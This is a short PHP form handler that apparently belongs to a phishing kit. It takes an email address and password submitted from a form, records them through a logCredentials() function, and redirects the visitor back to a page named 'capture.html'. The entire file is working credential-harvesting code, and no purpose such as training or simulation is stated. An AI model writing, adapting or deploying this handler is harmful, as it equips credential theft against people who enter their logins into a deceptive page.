<?php
require_once 'utils.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: capture.html');
    exit;
}

$email = sanitizeInput($_POST['email'] ?? '');
$password = sanitizeInput($_POST['password'] ?? '');

logCredentials('form', ['email' => $email, 'password' => $password]);

header('Location: capture.html');
exit;
